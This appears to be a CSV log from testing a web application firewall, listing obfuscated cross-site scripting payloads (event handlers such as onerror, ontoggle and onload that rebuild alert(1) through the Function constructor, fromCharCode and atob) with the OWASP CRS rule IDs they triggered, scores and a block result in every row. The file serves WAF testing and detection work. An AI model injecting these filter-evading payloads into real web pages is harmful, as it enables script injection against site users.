index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
6,<audio src onerror=self['Function']('al'+'ert(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o23,29v216,53t:urlDecode,t:replaceComments,t:compressWhitespace || v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,16v216,53t:urlDecodeUni,t:compressWhitespace || ",25,177826371731.927191
31,"<audio><source onerror=""Reflect.apply(top.Function('','return\x20al'+'ert'),top,[1])()""></audio>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826376757.850813
37,"<audio><source onerror=""(function(){return arguments.callee.caller.constructor})()('al\x65rt(1)')()""></audio>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o24,75v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782637796.988855
71,"<details ontoggle=Reflect.construct(function(){}.constructor,['ale'+'rt(1)'])() open></details>",0,1,block,5,"934100,934100,941100,941120,949110","o36,11v217,95 || o36,11v217,95t:urlDecodeUni || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826384999.224479
73,<details ontoggle=(typeof/**/Function!='undefined'?Function:window['Function'])('\x61lert(1)')() open></details>,0,1,block,5,"933210,941100,941120,941370,949110","o63,30v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o60,18v217,112t:urlDecodeUni,t:compressWhitespace || ",20,177826385382.025157
82,"<details ontoggle=(top.Function(top.String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,0x31,41)))() open>",0,1,block,4,"934100,941100,941120,949110","o36,19v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826387142.045620
86,"<details ontoggle=(self.Function(self.String.fromCharCode(0141,0154,0145,0162,0164,050,061,051)))() open>",0,1,block,4,"934100,941100,941120,949110","o38,19v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826387991.967915
87,"<details ontoggle=(parent['Function'](parent['String']['fromCharCode'](97,108,101,114,116,40,49,41)))() open>",0,1,block,4,"933210,941100,941120,949110","o18,85v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826388176.325048
152,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826401348.742637
156,<input onfocus=Function(atob('YWxlcnQoMSk='))() autofocus>,0,1,block,4,"941100,941120,941160,949110","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o6,9v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,15v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826402228.502982
